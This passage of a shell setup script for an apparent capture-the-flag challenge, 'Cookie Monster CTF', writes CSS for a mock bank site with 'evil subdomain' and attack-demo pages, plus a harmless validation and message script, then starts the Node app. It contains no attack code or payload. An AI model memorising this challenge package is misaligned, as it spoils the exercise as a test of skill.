    margin-bottom: 1rem;
    color: var(--dark-color);
}

.subtle-hint {
    color: #999;
    font-size: 0.9rem;
    font-style: italic;
}

.security-info {
    background-color: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.security-info h3 {
    margin-bottom: 1rem;
}

.security-info ul {
    margin-left: 1.5rem;
    margin-bottom: 1rem;
}

/* Auth Forms */
.auth-form {
    max-width: 500px;
    margin: 0 auto;
    background-color: white;
    padding: 2rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.auth-form h2 {
    margin-bottom: 1.5rem;
    text-align: center;
}

.auth-form .btn {
    width: 100%;
    padding: 0.75rem;
}

.error-alert {
    background-color: rgba(231, 76, 60, 0.1);
    color: var(--danger-color);
    padding: 0.75rem;
    border-radius: 4px;
    margin-bottom: 1.5rem;
    border-left: 4px solid var(--danger-color);
}

.form-footer {
    margin-top: 1.5rem;
    text-align: center;
}

/* Dashboard */
.dashboard h2 {
    margin-bottom: 1.5rem;
}

.accounts-section,
.transfer-section {
    background-color: white;
    padding: 1.5rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    margin-bottom: 2rem;
}

.accounts-section h3,
.transfer-section h3 {
    margin-bottom: 1.5rem;
    color: var(--dark-color);
}

.accounts-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 1.5rem;
}

.account-card {
    border: 1px solid #ddd;
    border-radius: 8px;
    padding: 1.5rem;
    background-color: var(--light-color);
}

.account-card h4 {
    margin-bottom: 1rem;
    color: var(--dark-color);
}

.account-card .balance {
    font-size: 1.5rem;
    font-weight: 600;
    margin-bottom: 0.5rem;
    color: var(--success-color);
}

.account-card .account-number {
    color: #777;
    font-size: 0.9rem;
}

.transfer-form {
    max-width: 600px;
}

.transfer-form .btn {
    margin-top: 1rem;
}

/* Admin Panel */
.admin-panel h2 {
    margin-bottom: 1.5rem;
}

.flag-section {
    background-color: white;
    padding: 1.5rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    margin-bottom: 2rem;
}

.flag-section h3 {
    margin-bottom: 1rem;
    color: var(--dark-color);
}

.flag {
    background-color: var(--dark-color);
    color: var(--light-color);
    padding: 1rem;
    border-radius: 4px;
    font-family: monospace;
    margin-bottom: 1.5rem;
    overflow-x: auto;
}

.accounts-table {
    width: 100%;
    border-collapse: collapse;
}

.accounts-table th,
.accounts-table td {
    padding: 0.75rem;
    text-align: left;
    border-bottom: 1px solid #ddd;
}

.accounts-table th {
    background-color: var(--light-color);
    font-weight: 600;
}

.accounts-table tr:nth-child(even) {
    background-color: #f9f9f9;
}

.small {
    font-size: 0.9rem;
    color: #777;
}

/* Evil Subdomain Styles */
.evil-content {
    background-color: #fee;
    padding: 2rem;
    border-radius: 8px;
    border: 2px solid var(--danger-color);
    margin-bottom: 2rem;
}

.attack-options {
    margin-top: 2rem;
}

.attack-card {
    background-color: white;
    padding: 1.5rem;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    margin-bottom: 1rem;
}

.attack-card h4 {
    margin-bottom: 1rem;
    color: var(--danger-color);
}

/* Attack Demo Page */
.attack-demo {
    background-color: #fee;
    padding: 2rem;
    border-radius: 8px;
    border: 2px solid var(--danger-color);
}

.attack-explanation {
    margin-bottom: 2rem;
}

.attack-explanation h3 {
    margin-bottom: 1rem;
    color: var(--danger-color);
}

.attack-explanation ul {
    margin-left: 1.5rem;
}

.attack-form {
    background-color: white;
    padding: 1.5rem;
    border-radius: 8px;
}

.attack-form h3 {
    margin-bottom: 1.5rem;
    color: var(--danger-color);
}

#attack-output {
    margin-top: 2rem;
    padding-top: 1.5rem;
    border-top: 1px solid #ddd;
}

#attack-output h4 {
    margin-bottom: 1rem;
}

#attack-url {
    background-color: #f5f5f5;
    padding: 1rem;
    border-radius: 4px;
    font-family: monospace;
    overflow-x: auto;
    margin-bottom: 1rem;
}

#attack-container {
    margin-top: 1.5rem;
}

.hidden {
    display: none;
}

/* Utilities */
.text-center {
    text-align: center;
}

.mt-2 {
    margin-top: 2rem;
}

.mb-2 {
    margin-bottom: 2rem;
}
EOF

    # Create JavaScript file
    cat > public/js/main.js << EOF
// Main JavaScript file for Cookie Monster CTF

document.addEventListener('DOMContentLoaded', function() {
    console.log('Cookie Monster CTF Challenge Loaded');
    
    // Check for success message in URL
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('success')) {
        showMessage('Transfer completed successfully!', 'success');
    }
    
    if (urlParams.has('flagRevealed')) {
        showMessage('Flag is now available at /flag.txt', 'success');
    }
    
    // Add event listeners for form validation
    const transferForms = document.querySelectorAll('.transfer-form');
    if (transferForms) {
        transferForms.forEach(form => {
            form.addEventListener('submit', function(e) {
                const amount = this.querySelector('input[name="amount"]').value;
                const to = this.querySelector('input[name="to"]').value;
                
                if (!amount || parseFloat(amount) <= 0) {
                    e.preventDefault();
                    showMessage('Please enter a valid amount', 'error');
                    return false;
                }
                
                if (!to) {
                    e.preventDefault();
                    showMessage('Please enter a valid destination account', 'error');
                    return false;
                }
                
                return true;
            });
        });
    }
    
    // Function to show messages
    function showMessage(message, type = 'info') {
        // Check if message container already exists
        let messageContainer = document.querySelector('.message-container');
        
        if (!messageContainer) {
            messageContainer = document.createElement('div');
            messageContainer.className = 'message-container';
            document.querySelector('main').prepend(messageContainer);
        }
        
        const messageElement = document.createElement('div');
        messageElement.className = \`message \${type}-message\`;
        messageElement.innerHTML = message;
        
        // Add close button
        const closeButton = document.createElement('button');
        closeButton.innerHTML = '&times;';
        closeButton.className = 'close-message';
        closeButton.addEventListener('click', function() {
            messageElement.remove();
        });
        
        messageElement.appendChild(closeButton);
        messageContainer.appendChild(messageElement);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            messageElement.remove();
        }, 5000);
    }
    
    // Add CSS for messages
    const style = document.createElement('style');
    style.textContent = \`
        .message-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 100;
            max-width: 300px;
        }
        
        .message {
            margin-bottom: 10px;
            padding: 12px 35px 12px 15px;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            position: relative;
            animation: slideIn 0.3s ease;
        }
        
        .info-message {
            background-color: #d1ecf1;
            color: #0c5460;
            border-left: 4px solid #0c5460;
        }
        
        .success-message {
            background-color: #d4edda;
            color: #155724;
            border-left: 4px solid #155724;
        }
        
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            border-left: 4px solid #721c24;
        }
        
        .close-message {
            position: absolute;
            top: 10px;
            right: 10px;
            background: none;
            border: none;
            font-size: 16px;
            cursor: pointer;
            color: inherit;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    \`;
    
    document.head.appendChild(style);
});
EOF

    echo "[+] Static files created successfully!"
}

echo "[+] Starting the application..."
cd "$CHALLENGE_DIR" || exit 1
nohup node app.js > challenge.log 2>&1 &
echo "[+] Application started. Access it at http://localhost:3000"